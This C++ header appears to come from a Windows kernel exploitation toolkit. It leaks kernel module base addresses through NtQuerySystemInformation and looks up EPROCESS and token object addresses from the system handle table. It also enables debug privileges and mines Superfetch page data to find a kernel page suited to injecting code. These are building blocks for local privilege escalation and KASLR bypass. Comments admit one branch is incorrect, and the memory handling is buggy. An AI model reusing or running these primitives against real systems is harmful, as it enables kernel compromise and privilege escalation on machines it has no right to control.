#pragma once

#include <memory>

#include <Common/undoc/SystemInfo.h>
#include <Common/user/Externs.h>
#include <Common/undoc/Undoc.h>

#include <intrin.h>
#include <winternl.h>

class CKernelInfo
{
	static
	void TerminateResolver(
		__inout CKernelInfo* kernelInfo
		)
	{
		if (!kernelInfo)
			return;
		kernelInfo->m_exit = true;
		WaitForSingleObject(kernelInfo->m_sync, INFINITE);
		printf("\nthread stopped\n");
	}

	static size_t m_ntoskrnl;
	HANDLE m_sync;
	bool m_exit;
	std::unique_ptr<RTL_PROCESS_MODULES> m_moduleInfo;

public:
	CKernelInfo() : 
		m_exit(false),
		m_sync(NULL)
	{
	}

	__checkReturn
	CKernelInfo*
	StartInitialization()
	{
		KernelInfoLeakParty(this);
		return this;
	}

	static 
	DWORD 
	WINAPI 
	KernelInfoLeakParty(
		__in void* instance
		)
	{
		auto kernel_info = static_cast<CKernelInfo*>(instance);
		kernel_info->m_moduleInfo = kernel_info->QueryInfo<RTL_PROCESS_MODULES>(SYSTEM_INFORMATION_CLASS_EX::SystemModuleInformation);

		if (kernel_info->m_moduleInfo.get() && kernel_info->m_moduleInfo->NumberOfModules)
			kernel_info->m_ntoskrnl = reinterpret_cast<size_t>(kernel_info->m_moduleInfo->Modules[0].ImageBase);
		
		return 0;
	}

	__checkReturn
	bool
	IsResolved()
	{
		return !!m_ntoskrnl;
	}

	size_t 
	GetNtBase()
	{
		return m_ntoskrnl;
	}

	size_t 
	GetWin32kBase()
	{
		for (size_t i = 0; i < m_moduleInfo->NumberOfModules; i++)
			if (!strnicmp("win32k.sys", m_moduleInfo.get()->Modules[i].FullPathName + m_moduleInfo->Modules[i].OffsetToFileName, sizeof("win32k.sys")))
				return reinterpret_cast<size_t>(m_moduleInfo->Modules[i].ImageBase);

		return NULL;
	}

	size_t 
	GetHalBase()
	{
		for (size_t i = 0; i < m_moduleInfo->NumberOfModules; i++)
			if (!strnicmp("hal.sys", m_moduleInfo.get()->Modules[i].FullPathName + m_moduleInfo->Modules[i].OffsetToFileName, sizeof("hal.sys")))
				return reinterpret_cast<size_t>(m_moduleInfo->Modules[i].ImageBase);

		return NULL;
	}
	
	size_t
	GetEProcess(
		__in DWORD procId
		)
	{
		auto handle_info = QueryInfo<SYSTEM_HANDLE_INFORMATION>(SYSTEM_INFORMATION_CLASS_EX::SystemHandleInformation);
		if (!handle_info.get())
			return 0;

		for (size_t i = 0; i < handle_info->HandleCount; i++)
			if (procId == handle_info->Handles[i].ProcessId && 7 == handle_info->Handles[i].ObjectTypeNumber)
				return reinterpret_cast<size_t>(handle_info->Handles[i].Object);

		return 0;
	}
	
	size_t
	GetToken(
		__in DWORD procId,
		__in HANDLE hToken
		)
	{
		auto handle_info = QueryInfo<SYSTEM_HANDLE_INFORMATION>(SYSTEM_INFORMATION_CLASS_EX::SystemHandleInformation);
		if (!handle_info.get())
			return 0;

		for (size_t i = 0; i < handle_info->HandleCount; i++)
			if (procId == handle_info->Handles[i].ProcessId)
			{
				if (hToken == reinterpret_cast<HANDLE>(handle_info->Handles[i].Handle))
					return reinterpret_cast<size_t>(handle_info->Handles[i].Object);
			}

		return 0;
	}
	
	size_t
	QueryExecWritePage()
	{
#ifdef _WIN64//tested just for x64
		BOOLEAN enabled = FALSE;
		NTSTATUS status = RtlAdjustPrivilege(0xd, TRUE, NULL, &enabled);
		if (status || !enabled)
			return 0;

		status = RtlAdjustPrivilege(0x14, TRUE, NULL, &enabled);
		if (status || !enabled)
			return 0;
		
		auto superfetch_info = std::unique_ptr<SUPERFETCH_INFORMATION>(
			static_cast<SUPERFETCH_INFORMATION*>(malloc(sizeof(SUPERFETCH_INFORMATION) + sizeof(PF_PFN_PRIO_REQUEST))));

		if (!superfetch_info.get())
			return 0;

		RtlZeroMemory(superfetch_info.get(), sizeof(SUPERFETCH_INFORMATION) + sizeof(*superfetch_info->Data));

		size_t n_read = 0;
		superfetch_info->Version = SUPERFETCH_INFORMATION_VERSION;
		superfetch_info->Magic = SUPERFETCH_INFORMATION_MAGIC;
		superfetch_info->InfoClass = SuperfetchPfnQuery;
		superfetch_info->Data = reinterpret_cast<PF_PFN_PRIO_REQUEST*>(superfetch_info.get() + 1);
		superfetch_info->Length = sizeof(SUPERFETCH_INFORMATION) + sizeof(*superfetch_info->Data);

		PF_PFN_PRIO_REQUEST* request = superfetch_info->Data;
		request->Version = PF_PFN_PRIO_REQUEST_VERSION;
		request->RequestFlags = PF_PFN_PRIO_REQUEST_QUERY_MEMORY_LIST;
		request->PfnCount = _countof(request->PageData);

		for (size_t pfi = 0; pfi < (size_t)(~0); pfi += request->PfnCount)
		{
			for (size_t i = 0; i < request->PfnCount; i++)
				request->PageData[i].PageFrameIndex = pfi + i + 1;

			status = NtQuerySystemInformation(
				(SYSTEM_INFORMATION_CLASS)SystemSuperfetchInformation,
				superfetch_info.get(),
				sizeof(*superfetch_info),
				reinterpret_cast<PULONG>(&n_read));

			for (size_t i = 0; i < _countof(request->PageData); i++)
			{
#ifdef WIN8
				//necessary to test properly, now it is not correct, bud general idea is OK
				if (reinterpret_cast<size_t>(request->PageData[i].VirtualAddress) > MMHIGHESTUSERADDRESS)
				{
					if (request->PageData[i].PageDirInfo.UseDescription == MMPFNUSE_PAGETABLE)
						if ((request->PageData[i].PageDirInfo.ListDescription == MMPFNLIST_ACTIVE))
						{
							//printf("\n\n! %p (%x %x)\n", request->PageData[i].VirtualAddress, request->PageData[i].PageDirInfo.UseDescription, request->PageData[i].PageDirInfo.ListDescription);
							return reinterpret_cast<size_t>(request->PageData[i].VirtualAddress) + (PAGE_SIZE * 1 - 0x80);
						}

				}
#else
				if (reinterpret_cast<size_t>(request->PageData[i].VirtualAddress) > MMHIGHESTUSERADDRESS)
				{
					size_t mask = (MMPFNUSE_NONPAGEDPOOL);
					if (mask == (mask & request->PageData[i].PageDirInfo.UseDescription) && 
						request->PageData[i].PageDirInfo.PageDirectoryBase)
					{
						size_t dir_base = static_cast<size_t>(request->PageData[i].PageDirInfo.PageDirectoryBase) | (static_cast<size_t>(0xFFFF) << (4 * (16 - 4)));
						//printf("!pte %p + %p ;",  dir_base, (PAGE_SIZE * 2 - 0x80));
						return dir_base + (SPAGE_SIZE * 2 - 0x80);
					}
				}
#endif
			}
		}

#endif
		return NULL;
	}

protected:
	template<typename SYS_TYPE>
	__checkReturn
	std::unique_ptr<SYS_TYPE>
	QueryInfo(
		__in SYSTEM_INFORMATION_CLASS_EX sysClass
		)
	{
		size_t size = sizeof(RTL_PROCESS_MODULES) + SPAGE_SIZE;
		NTSTATUS status = STATUS_INFO_LENGTH_MISMATCH;
		void* info = malloc(size);
		if (!info)
			return std::unique_ptr<SYS_TYPE>(nullptr);

		for (; STATUS_INFO_LENGTH_MISMATCH == status; size *= 2)
		{
			status = NtQuerySystemInformation(
				(SYSTEM_INFORMATION_CLASS)sysClass,
				info,
				size,
				nullptr);

			info = realloc(info, size * 2);
			if (!info)
				break;
		}

		std::unique_ptr<SYS_TYPE> r_info = std::unique_ptr<SYS_TYPE>(static_cast<SYS_TYPE*>(info));
		return r_info;
	}
};

__declspec(selectany) size_t CKernelInfo::m_ntoskrnl = NULL;
